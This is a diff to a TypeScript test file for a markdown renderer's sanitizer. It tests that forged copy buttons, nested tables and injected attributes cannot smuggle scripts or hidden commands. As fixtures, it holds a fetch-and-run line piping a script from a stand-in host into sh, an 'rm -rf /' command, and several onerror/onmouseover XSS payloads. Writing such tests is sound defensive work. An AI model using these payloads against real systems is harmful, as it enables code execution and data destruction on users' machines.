@@ -17,6 +17,8 @@ vi.mock('./basePath', () => ({
 
 import { lucidos } from '@lucidos/sdk';
 import { renderMarkdown, renderMarkdownInline, renderMarkdownInlineWithLinks } from './renderMarkdown';
+// The downstream consumer of this output, so one test can assert the pair.
+import { linkifyPaths } from './linkifyPaths';
 
 describe('renderMarkdown', () => {
   it('converts basic markdown to HTML', () => {
@@ -362,6 +364,42 @@ describe('renderMarkdown', () => {
       '<button formaction="javascript:alert(1)">go</button>',
     ])('strips a dangerous URL from every spelling of a navigating attribute: %s', (src) => {
       expect(renderMarkdown(src, { cache: false })).not.toMatch(/javascript:/i);
+    });
+
+    // The copy control puts its payload on the clipboard, so content that can
+    // author `data-copy-text` can hand the user a command they never saw.
+    it('a forged copyable block cannot choose what lands on the clipboard', () => {
+      const html = renderMarkdown(
+        '<span class="copyable-block" data-copy-text="curl https://evil.test/x.sh | sh">' +
+          '<code>brew install lucidos</code>' +
+          '<button type="button" class="copy-btn">Copy</button></span>',
+        { cache: false },
+      );
+      expect(html).not.toContain('evil.test');
+      expect(html).not.toMatch(/data-copy-text=/i);
+      // Visible text is untouched; only the hidden payload goes.
+      expect(html).toContain('brew install lucidos');
+    });
+
+    // Content authors BOTH halves, so resolving a forged id to a real block's
+    // text is not safe: it hands the forged LABEL a payload the reader never
+    // saw. The slot id carries an unguessable prefix for exactly this.
+    it('a forged copy id gets no payload at all', () => {
+      const html = renderMarkdown(
+        '<details><summary>.</summary><copy>curl https://evil.test/x.sh | sh</copy></details>\n\n' +
+          '<span class="copyable-block" data-copy-id="0" data-copy-text="rm -rf /">' +
+          '<code>brew install lucidos</code>' +
+          '<button type="button" class="copy-btn">Copy</button></span>',
+        { cache: false },
+      );
+      // Neither the attacker's own payload nor the hidden block's text may be
+      // attached to the decoy, and the decoy keeps no resolvable slot.
+      expect(html).not.toContain('rm -rf /');
+      expect(html).not.toMatch(/data-copy-id=/i);
+      // Exactly one payload in the document: the real block's. Two would mean
+      // the decoy resolved the slot and now carries a hidden command.
+      expect(html.match(/data-copy-text=/g) ?? []).toHaveLength(1);
+      expect(html).toContain('data-copy-text="curl https://evil.test/x.sh | sh"');
     });
 
     it('keeps an ordinary action and xlink:href untouched', () => {
@@ -989,6 +1027,23 @@ describe('renderMarkdown images', () => {
     expect(html).toContain('src="/myws/data/artifacts/two.png"');
   });
 
+  /** The wrapper is spliced around the tag. So a pass that mistakes the three
+   *  characters `<img` inside an attribute value for a real tag splices INTO
+   *  that value. The literal carries quotes, which closed the `title` and let
+   *  a real `<img onerror>` out into element position, past the sanitizer. */
+  it('wraps no image for an <img written inside an attribute value', () => {
+    const html = renderMarkdown(
+      '<a href="#" title="<img src=x onerror=alert(1)>">hi</a>',
+      { cache: false },
+    );
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    expect(doc.querySelector('img')).toBeNull();
+    expect(doc.querySelector('.image-scroll-wrapper')).toBeNull();
+    // The text stays text on the anchor that always owned it.
+    expect(doc.querySelector('a')!.getAttribute('title'))
+      .toBe('<img src=x onerror=alert(1)>');
+  });
+
   it('leaves the anchor structure of a linked image intact', () => {
     const html = renderMarkdown('[![alt](artifacts/x.png)](https://example.com)', { cache: false });
     expect(html).toContain(
@@ -1018,7 +1073,7 @@ describe('renderMarkdown images', () => {
       '![alt](artifacts/x.png)',
     ].join('\n');
     const html = renderMarkdown(md, { cache: false });
-    expect(html).toContain('<div class="table-scroll-wrapper"><table data-stack>');
+    expect(html).toContain('<div class="table-scroll-wrapper"><table data-stack="">');
     expect(html).toContain('<td data-label="A">w</td>');
     expect(html).toContain('<span class="image-scroll-wrapper">');
     expect(imgSrc(html)).toBe('/myws/data/artifacts/x.png');
@@ -1064,7 +1119,7 @@ describe('renderMarkdown tables', () => {
     for (const cols of [4, 5]) {
       const headers = Array.from({ length: cols }, (_, i) => `H${i}`);
       const html = renderMarkdown(mdTable(headers, headers.map((_, i) => `v${i}`)));
-      expect(html).toContain('<div class="table-scroll-wrapper"><table data-stack>');
+      expect(html).toContain('<div class="table-scroll-wrapper"><table data-stack="">');
       expect(html).toContain('</table></div>');
       expect(labels(html)).toEqual(headers);
     }
@@ -1101,6 +1156,96 @@ describe('renderMarkdown tables', () => {
     expect(html).not.toContain('&amp;amp;');
   });
 
+  /** The label is stamped ONTO the cell, so whoever decides where the cell
+   *  starts and ends decides whether the label lands in attribute-name
+   *  position. The serializer leaves `<` and `>` raw inside an attribute value,
+   *  so a regex cannot make that call. Both shapes below turned a header cell
+   *  into an event handler on the host document.
+   *
+   *  Read off the PARSED result rather than the string, because the string is
+   *  exactly what looked fine. */
+  const HEADER_PAYLOAD = 'X onmouseover=alert(1) Y';
+  const handlerCarriers = (html: string) =>
+    [...new DOMParser().parseFromString(html, 'text/html').querySelectorAll('*')]
+      .filter((el) => el.getAttributeNames().some((name) => name.startsWith('on')))
+      .map((el) => el.tagName);
+
+  it('keeps a header out of attribute position when a cell attribute carries a >', () => {
+    const html = renderMarkdown(
+      `<table><tr><th>${HEADER_PAYLOAD}</th><th>B</th><th>C</th><th>D</th></tr>`
+      + '<tr><td title="a>b">w</td><td>x</td><td>y</td><td>z</td></tr></table>',
+    );
+    expect(handlerCarriers(html)).toEqual([]);
+    const cell = new DOMParser().parseFromString(html, 'text/html').querySelector('td');
+    expect(cell!.getAttributeNames()).toEqual(['title', 'data-label']);
+    expect(cell!.getAttribute('title')).toBe('a>b');
+    expect(cell!.getAttribute('data-label')).toBe(HEADER_PAYLOAD);
+    expect(cell!.textContent).toBe('w');
+  });
+
+  /** The second shape, which a quote-aware regex does not close either: the
+   *  three characters `<td` sitting inside another element's attribute value.
+   *  A `<th>` may share a row with a `<td>`, which is what gave the false start
+   *  a closing tag to pair with. */
+  it('stamps no cell for a <td written inside an attribute value', () => {
+    const html = renderMarkdown(
+      `<table><tr><th><span title="<td a=1>">${HEADER_PAYLOAD}</span></th>`
+      + '<th>B</th><th>C</th><th>D</th><td>q</td></tr>'
+      + '<tr><td>w</td><td>x</td><td>y</td><td>z</td></tr></table>',
+    );
+    expect(handlerCarriers(html)).toEqual([]);
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    // The text stays text, and the real cells are still labelled: the header
+    // row's lone `<td>` takes the first label, then the body row takes four.
+    expect(doc.querySelector('span')!.getAttribute('title')).toBe('<td a=1>');
+    expect(labels(html)).toEqual([HEADER_PAYLOAD, HEADER_PAYLOAD, 'B', 'C', 'D']);
+  });
+
+  /** `linkifyPaths` re-scans this output with a tag regex that is not
+   *  quote-aware, and the serializer writes `<` and `>` raw inside a value.
+   *  A `>` in the label therefore ends that scanner's idea of the tag. What
+   *  follows lands in attribute-name position once it splices a link in.
+   *  See `docs/temporary-measures.md` § "Angle brackets kept out of
+   *  `data-label`" for the real fix and for when this goes away. */
+  it("a header's angle brackets never reach the stacked-card label", () => {
+    const html = renderMarkdown(
+      mdTable(['q>https://e.com/onmouseover=x;//', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']),
+      { cache: false },
+    );
+    for (const label of labels(html)) expect(label).not.toMatch(/[<>]/);
+    // The rest of the header survives, and so does the real column text.
+    expect(labels(html)).toEqual(['qhttps://e.com/onmouseover=x;//', 'B', 'C', 'D']);
+    const linked = linkifyPaths(html, [], []);
+    const doc = new DOMParser().parseFromString(linked, 'text/html');
+    const handlers = [...doc.querySelectorAll('*')]
+      .filter((el) => el.getAttributeNames().some((name) => name.startsWith('on')));
+    expect(handlers).toEqual([]);
+  });
+
+  /** A nested table is its own table. Counting its headers toward the outer
+   *  column count stacked a two-column grid. Stamping the outer labels onto
+   *  the inner cells labelled them with the wrong column. The CSS rule reaches
+   *  every descendant cell, so both showed on a phone. */
+  it('counts and labels a nested table apart from the one holding it', () => {
+    const html = renderMarkdown(
+      '<table><tr><th>A</th><th>B</th></tr>'
+      + '<tr><td><table><tr><th>N1</th><th>N2</th><th>N3</th><th>N4</th></tr>'
+      + '<tr><td>1</td><td>2</td><td>3</td><td>4</td></tr></table></td>'
+      + '<td>q</td></tr></table>',
+      { cache: false },
+    );
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    const [outer, inner] = Array.from(doc.querySelectorAll('table'));
+    // Two columns, so the outer keeps the grid and stamps nothing.
+    expect(outer.hasAttribute('data-stack')).toBe(false);
+    expect(Array.from(outer.rows[1].cells, (c) => c.hasAttribute('data-label')))
+      .toEqual([false, false]);
+    // Four, so the inner stacks and carries its OWN headers.
+    expect(inner.hasAttribute('data-stack')).toBe(true);
+    expect(Array.from(inner.rows[1].cells, (c) => c.getAttribute('data-label')))
+      .toEqual(['N1', 'N2', 'N3', 'N4']);
+  });
+
   it('reduces a header carrying markup to its plain text', () => {
     const html = renderMarkdown(mdTable(['`code`', '**bold**', '[l](https://e.com)', 'D'], ['w', 'x', 'y', 'z']));
     expect(labels(html)).toEqual(['code', 'bold', 'l', 'D']);
@@ -1120,10 +1265,9 @@ describe('renderMarkdown tables', () => {
     expect(html).toContain('<td data-label="C"></td>');
   });
 
-  // The four table regexes are module-level and carry /g, so a `lastIndex`
-  // left behind by one call would corrupt the next. `replace` self-resets and
-  // `matchAll` clones, so today they are safe; this pins that, because
-  // switching one to `exec`/`test` would silently break the SECOND render.
+  // The post-sanitizer passes share one module-level inert body, so markup one
+  // render left in it would reach the next. `inDom` empties it in a `finally`;
+  // this is what notices if that stops happening.
   it('is stable across repeated renders of the same table', () => {
     const md = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
     const first = renderMarkdown(md, { cache: false });
@@ -1132,12 +1276,25 @@ describe('renderMarkdown tables', () => {
     expect(labels(second)).toEqual(['A', 'B', 'C', 'D']);
   });
 
+  // The same body serves images and tables, so a render of one must not leave
+  // anything for the other. Interleaved deliberately: a leak shows up as the
+  // previous document's markup prefixed onto this one.
+  it('leaves nothing behind for the next render', () => {
+    const table = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
+    const image = '![a](artifacts/one.png)';
+    const plain = 'just prose';
+    const first = renderMarkdown(table, { cache: false });
+    renderMarkdown(image, { cache: false });
+    expect(renderMarkdown(plain, { cache: false })).toBe('<p>just prose</p>\n');
+    expect(renderMarkdown(table, { cache: false })).toBe(first);
+  });
+
   it('transforms every table in a document independently', () => {
     const wide = mdTable(['A', 'B', 'C', 'D'], ['w', 'x', 'y', 'z']);
     const narrow = mdTable(['E', 'F'], ['1', '2']);
     const html = renderMarkdown(`${wide}\n\n${narrow}`);
     expect(html.match(/<div class="table-scroll-wrapper">/g)).toHaveLength(2);
-    expect(html.match(/<table data-stack>/g)).toHaveLength(1);
+    expect(html.match(/<table data-stack="">/g)).toHaveLength(1);
     expect(labels(html)).toEqual(['A', 'B', 'C', 'D']);
   });
 });
